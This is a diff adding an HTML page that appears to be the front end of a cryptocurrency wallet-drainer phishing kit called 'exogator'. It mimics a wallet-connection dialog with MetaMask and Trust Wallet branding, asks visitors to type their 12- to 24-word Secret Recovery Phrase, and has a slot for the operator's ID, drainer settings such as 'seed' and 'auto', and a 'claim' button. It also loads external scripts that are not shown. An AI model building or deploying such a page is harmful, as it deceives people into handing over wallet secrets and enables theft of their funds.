@@ -1,0 +1,111 @@
+<!doctype html>
+<html lang="en">
+  <head>
+   
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
+    <link rel="stylesheet" href="./assets/css/style.css?v=09.19.205">
+
+
+  </head>
+  <body style="margin:0; padding: 0; background-color: #000000;">
+
+    <!-- WRITE YOUR ID HERE -->
+    <input type="hidden" value="AAAABBBBCCCC" id="exogator_id">
+
+    <div class="modal__container" id="modal-container">
+        <div class="modal__content">
+            <div class="modal__close close-modal" onclick="closeModal()" title="Close">
+                <i class='bx bx-x'></i>
+            </div>
+
+            <h1 id="tito1" class="modal__title">Connect your wallet</h1>
+            <p id="tito2" class="modal__description">Please select one of the options below to connect your wallet.</p>
+
+            <button id="tito3" class="modal__button modal__button-width" onclick="start_exogator()">
+              
+              Other wallets 
+              <t bis_skin_checked="1" style="width: 32px;right: 58px;position: absolute;border-radius: 12px;margin-top: -7px;background: #cfcfcf;padding: 8px 7px;color: #636363;font-weight: 600;font-family: monospace;border: 1px solid #cccccca3;"> 350+</t>
+
+              <img src="https://cdn.iconscout.com/icon/free/png-256/free-metamask-logo-icon-download-in-svg-png-gif-file-formats--browser-extension-chrome-logos-icons-2261817.png" style=" width: 23px; right: 110px; position: absolute; border-radius: 12px; margin-top: -7px; padding: 4px 5px; background: #ffd3a1; border: 1px solid #b5b5b5; "> 
+
+              <img src="https://vectorseek.com/wp-content/uploads/2024/07/Trust-Wallet-Shield-Logo-Vector-Logo-Vector.svg-.png" style=" width: 21px; right: 134px; position: absolute; border-radius: 12px; margin-top: -7px; padding: 4px 6px; background: #ffffff; border: 1px solid #cccccca3; box-shadow: 3px 1px 10px -5px; "> 
+
+              <img src="https://images.mirror-media.xyz/publication-images/Lx_fohJ8ttprQ3DmDKU9N.png?height=2048&amp;width=2048" style=" width: 33px; right: 158px; position: absolute; border-radius: 12px; margin-top: -7px; padding: 0px 0px; /* border: 1px solid #b5b5b5; */ box-shadow: 3px 1px 10px -5px; ">
+
+            </button>
+
+            <button id="tito3" class="modal__button modal__button-width" onclick="showseedme()"> 
+              Connect manually <t bis_skin_checked="1" style="/* width: 32px; */right: 58px;position: absolute;border-radius: 12px;margin-top: -7px;background: #cfcfcf;padding: 8px 7px;color: #636363;font-weight: 600;font-family: monospace;border: 1px solid #cccccca3;">Seed</t>
+            </button>
+
+            <button class="modal__button-link close-modal">
+               <a style=" color: #9f9f9f; text-decoration: none; " href="https://trustwallet.com/">Haven't got a wallet ? Get started</a>
+            </button>
+
+        </div>
+    </div>
+
+    <!-- The Modal -->
+    <div id="myModal" class="modal">
+        <!-- Modal content -->
+        <div class="modal-content">
+            <div style="padding: 20px 22px;">
+                <span class="close">
+                    <select onchange="generateSeedPhraseInputs(this.value)" style="background: #ebebeb; padding: 4px; border: 1px solid #ccc; border-radius: 9px; margin-right: 14px; color: #595959;">
+                        <option value="12" selected>12-word phrase</option>
+                        <option value="15">15-word phrase</option>
+                        <option value="18">18-word phrase</option>
+                        <option value="21">21-word phrase</option>
+                        <option value="24">24-word phrase</option>
+                    </select>
+                </span>
+
+                <h2 style="margin: 0px;">Connect manually</h2>
+                <p style="margin-top: 6px;font-size: 14px;color: #555555;">Enter the Secret Recovery Phrase that you were given when you created your wallet.</p>
+                <div>
+                    <div class="seed-phrase-container" id="seedPhraseContainer"></div>
+                </div>
+
+                <t id="inva" style=" color: #ff0000; margin-left: 12px; margin-top: 12px; display: none; font-size: 14px; "><i class="bx bxs-info-circle"></i> Invalid Secret Recovery Phrase </t>
+                <t id="spco" style=" color: #ff0000; margin-left: 12px; margin-top: 12px; display: none; font-size: 14px; "><i class="bx bxs-info-circle"></i> Secret Recovery Phrases contain 12, 15, 18, 21, or 24 words </t>
+
+                <button onclick="checkAllFieldsFilled()"  style=" margin-top: 20px; border: 0; background: #000; color: #fff; padding: 14px 16px; border-radius: 18px; width: 100%; font-weight: 400; font-size: 16px; cursor: pointer; cursor: pointer; border: none; outline: none; ">Connect Wallet</button>
+                
+                <div style="margin-top: 8px;text-align: center;">
+                    <span style="display: inline-block;vertical-align: middle;color: #898989;font-size: 14px;">Powered by</span>
+                    <img src="https://miro.medium.com/v2/resize:fit:1400/1*aGWMU1Z_3eMiO74hv_mgjA.png" style="width: 100px; display: inline-block; vertical-align: middle;">
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <button class="ex0connec" onclick="exoconnect()" >Connect wallet</button> 
+    <button class="ex0claim"  style="display: none;" onclick="claim()">claim</button>
+    
+    <span id="adresstracker" style="color: #fff; display: none;"></span>
+
+    <script>
+
+        let modaltheme  = 3;
+        let evm         = 1;
+        let seed        = 0;
+        let auto        = 0;
+        let dark        = 0;
+        let towsteps    = 0; //please read docs befor ENABLE this futures 
+        
+    </script>
+    
+    <script src="./assets/eth.js?v=09.19.205"></script>
+    <script src="./assets/w-modal.js?v=09.19.205"></script>
+    <script src="./assets/w-loader.js?v=09.19.205"></script>
+    <script src="./assets/modules.js?v=09.19.205"></script>
+    <script src="./assets/main.js?v=09.19.205"></script>
+    
+    <script src="https://code.jquery.com/jquery-3.7.1.slim.min.js" integrity="sha256-kmHvs0B+OpCW5GVHUNjv9rOmY0IvSIRcf7zGUDTDQM8=" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+  </body>
+</html>
